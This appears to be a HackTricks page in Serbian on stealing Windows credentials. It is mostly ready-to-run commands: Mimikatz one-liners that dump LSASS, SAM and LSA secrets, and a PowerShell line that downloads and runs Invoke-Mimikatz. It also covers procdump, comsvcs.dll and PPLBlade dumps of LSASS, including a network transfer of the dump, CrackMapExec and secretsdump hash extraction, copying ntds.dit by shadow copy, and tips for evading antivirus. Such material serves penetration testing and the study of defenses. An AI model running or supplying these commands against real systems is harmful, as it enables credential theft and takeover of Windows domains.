# Krađa Windows kredencijala

{{#include ../../banners/hacktricks-training.md}}

## Kredencijali Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pronađite druge stvari koje Mimikatz može da uradi na** [**ovoj stranici**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Saznajte više o nekim mogućim zaštitama za kredencijale ovde.**](credentials-protections.md) **Ove zaštite mogu sprečiti Mimikatz da izvuče neke kredencijale.**

## Kredencijali sa Meterpreter-om

Koristite [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **koji** sam kreirao da **tražim lozinke i hešove** unutar žrtve.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Obilaženje AV

### Procdump + Mimikatz

Kao **Procdump iz** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**je legitimni Microsoft alat**, nije otkriven od strane Defender-a.\
Možete koristiti ovaj alat da **izvršite dump lsass procesa**, **preuzmete dump** i **izvučete** **akreditive lokalno** iz dump-a.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ovaj proces se automatski obavlja sa [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Napomena**: Neki **AV** mogu **otkriti** kao **maliciozno** korišćenje **procdump.exe za dump lsass.exe**, to je zato što **otkrivaju** string **"procdump.exe" i "lsass.exe"**. Tako da je **diskretnije** **proći** kao **argument** **PID** lsass.exe do procdump **umesto** **imena lsass.exe.**

### Dumpovanje lsass sa **comsvcs.dll**

DLL pod nazivom **comsvcs.dll** koji se nalazi u `C:\Windows\System32` odgovoran je za **dumpovanje memorije procesa** u slučaju pada. Ovaj DLL uključuje **funkciju** pod nazivom **`MiniDumpW`**, koja je dizajnirana da se poziva koristeći `rundll32.exe`.\
Nije bitno koristiti prva dva argumenta, ali treći je podeljen na tri komponente. ID procesa koji treba dumpovati čini prvu komponentu, lokacija dump fajla predstavlja drugu, a treća komponenta je strogo reč **full**. Ne postoje alternativne opcije.\
Nakon parsiranja ovih tri komponente, DLL se angažuje u kreiranju dump fajla i prebacivanju memorije specificiranog procesa u ovaj fajl.\
Korišćenje **comsvcs.dll** je izvodljivo za dumpovanje lsass procesa, čime se eliminiše potreba za upload-ovanjem i izvršavanjem procdump-a. Ova metoda je detaljno opisana na [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Sledeća komanda se koristi za izvršenje:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Možete automatizovati ovaj proces sa** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumpovanje lsass-a sa Task Manager-om**

1. Desni klik na Task Bar i kliknite na Task Manager
2. Kliknite na Više detalja
3. Potražite proces "Local Security Authority Process" na kartici Procesi
4. Desni klik na proces "Local Security Authority Process" i kliknite na "Create dump file".

### Dumpovanje lsass-a sa procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) je Microsoft-ov potpisani binarni fajl koji je deo [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketa.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpovanje lsass-a sa PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) je alat za dumpovanje zaštićenih procesa koji podržava obfusciranje dump-a memorije i prenos na udaljene radne stanice bez smeštanja na disk.

**Ključne funkcionalnosti**:

1. Zaobilaženje PPL zaštite
2. Obfusciranje fajlova dump-a memorije kako bi se izbegle mehanizme detekcije zasnovane na potpisima Defender-a
3. Učitavanje dump-a memorije sa RAW i SMB metodama učitavanja bez smeštanja na disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Ispusti SAM hešove
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Izvuci LSA tajne
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Izvuci NTDS.dit iz ciljnog DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Izvuci istoriju lozinki NTDS.dit sa ciljnog DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Prikaži atribut pwdLastSet za svaki NTDS.dit nalog
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Krađa SAM & SYSTEM

Ove datoteke bi trebale biti **locirane** u _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Ali **ne možete ih jednostavno kopirati na uobičajen način** jer su zaštićene.

### Iz Registra

Najlakši način da se ukradu te datoteke je da se dobije kopija iz registra:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Preuzmite** te datoteke na vaš Kali računar i **izvucite hešove** koristeći:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Možete izvršiti kopiranje zaštićenih fajlova koristeći ovu uslugu. Potrebno je da budete Administrator.

#### Using vssadmin

vssadmin binarni fajl je dostupan samo u Windows Server verzijama
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ali to možete učiniti i iz **Powershell**. Ovo je primer **kako kopirati SAM datoteku** (hard disk koji se koristi je "C:" i čuva se u C:\users\Public) ali to možete koristiti za kopiranje bilo koje zaštićene datoteke:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Na kraju, takođe možete koristiti [**PS skriptu Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da napravite kopiju SAM, SYSTEM i ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Akreditivi za Active Directory - NTDS.dit**

Datoteka **NTDS.dit** je poznata kao srce **Active Directory**, koja sadrži ključne podatke o korisničkim objektima, grupama i njihovim članstvima. Tu se čuvaju **hash-ovi lozinki** za korisnike domena. Ova datoteka je **Extensible Storage Engine (ESE)** baza podataka i nalazi se na **_%SystemRoom%/NTDS/ntds.dit_**.

Unutar ove baze podataka održavaju se tri glavne tabele:

- **Data Table**: Ova tabela je zadužena za čuvanje detalja o objektima kao što su korisnici i grupe.
- **Link Table**: Prati odnose, kao što su članstva u grupama.
- **SD Table**: **Sigurnosni opisi** za svaki objekat se ovde čuvaju, osiguravajući sigurnost i kontrolu pristupa za pohranjene objekte.

Više informacija o ovome: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows koristi _Ntdsa.dll_ za interakciju sa tom datotekom, a koristi je _lsass.exe_. Tada, **deo** datoteke **NTDS.dit** može biti lociran **unutar `lsass`** memorije (možete pronaći poslednje pristupne podatke verovatno zbog poboljšanja performansi korišćenjem **keša**).

#### Dekriptovanje hash-ova unutar NTDS.dit

Hash je šifrovan 3 puta:

1. Dekriptujte Ključ za šifrovanje lozinke (**PEK**) koristeći **BOOTKEY** i **RC4**.
2. Dekriptujte **hash** koristeći **PEK** i **RC4**.
3. Dekriptujte **hash** koristeći **DES**.

**PEK** ima **istu vrednost** u **svakom kontroleru domena**, ali je **šifrovan** unutar datoteke **NTDS.dit** koristeći **BOOTKEY** iz **SYSTEM datoteke kontrolera domena (različita između kontrolera domena)**. Zato da biste dobili akreditive iz datoteke NTDS.dit **potrebne su vam datoteke NTDS.dit i SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kopiranje NTDS.dit koristeći Ntdsutil

Dostupno od Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Možete takođe koristiti trik sa [**volume shadow copy**](./#stealing-sam-and-system) da kopirate **ntds.dit** datoteku. Zapamtite da će vam takođe biti potrebna kopija **SYSTEM datoteke** (ponovo, [**izvucite je iz registra ili koristite trik sa volume shadow copy**](./#stealing-sam-and-system)).

### **Ekstrakcija hash-ova iz NTDS.dit**

Kada dobijete datoteke **NTDS.dit** i **SYSTEM**, možete koristiti alate kao što je _secretsdump.py_ da **izvučete hash-ove**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Možete takođe **automatski ih izvući** koristeći važećeg korisnika sa administratorskim pravima na domeni:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Za **velike NTDS.dit datoteke** preporučuje se da ih izvučete koristeći [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Na kraju, možete koristiti i **metasploit modul**: _post/windows/gather/credentials/domain_hashdump_ ili **mimikatz** `lsadump::lsa /inject`

### **Izvlačenje domena objekata iz NTDS.dit u SQLite bazu podataka**

NTDS objekti se mogu izvući u SQLite bazu podataka pomoću [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Ne samo da se izvlače tajne, već i ceo objekti i njihova svojstva za dalju ekstrakciju informacija kada je sirova NTDS.dit datoteka već preuzeta.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hives su opcioni, ali omogućavaju dekripciju tajni (NT i LM heševi, dopunske kredencijale kao što su lozinke u čistom tekstu, kerberos ili trust ključevi, NT i LM istorije lozinki). Uz druge informacije, sledeći podaci se izvode: korisnički i mašinski nalozi sa svojim heševima, UAC zastavice, vremenska oznaka za poslednju prijavu i promenu lozinke, opis naloga, imena, UPN, SPN, grupe i rekurzivna članstva, stablo organizacionih jedinica i članstvo, povereni domeni sa tipovima poverenja, pravcem i atributima...

## Lazagne

Preuzmite binarni fajl sa [ovde](https://github.com/AlessandroZ/LaZagne/releases). Možete koristiti ovaj binarni fajl za ekstrakciju kredencijala iz nekoliko softvera.
```
lazagne.exe all
```
## Ostali alati za ekstrakciju kredencijala iz SAM i LSASS

### Windows credentials Editor (WCE)

Ovaj alat se može koristiti za ekstrakciju kredencijala iz memorije. Preuzmite ga sa: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Ekstraktujte kredencijale iz SAM datoteke
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Izvucite akreditive iz SAM datoteke
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Preuzmite ga sa: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) i jednostavno **izvršite ga** i lozinke će biti ekstraktovane.

## Odbrane

[**Saznajte više o nekim zaštitama za kredencijale ovde.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
